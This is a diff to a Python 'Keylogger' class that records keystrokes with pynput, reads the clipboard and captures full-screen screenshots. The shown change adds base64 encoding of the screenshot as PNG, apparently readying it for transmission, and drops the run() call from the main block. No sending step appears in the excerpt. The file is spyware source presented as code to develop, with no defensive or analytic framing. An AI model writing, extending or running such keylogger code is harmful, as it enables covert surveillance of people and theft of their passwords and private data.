@@ -1,6 +1,8 @@
 from pynput import keyboard
 import clipboard as cb
 from mss.windows import MSS as ss
+import mss
+import base64
 
 class Keylogger:
     __callback = None
@@ -47,7 +49,9 @@ class Keylogger:
         return cb.paste()
 
     def screenShot(self):
-        return self.__ss.grab(self.__ss.monitors[0])
+        img = self.__ss.grab(self.__ss.monitors[0])
+        bytes = mss.tools.to_png(img.rgb, img.size)
+        return base64.b64encode(bytes)
 
     def run(self):
         listener = keyboard.Listener(
@@ -61,6 +65,5 @@ if __name__ == "__main__":
         print("Key Pressed: ", key)
 
     keylogger = Keylogger(callback)
-    keylogger.run()
         
     
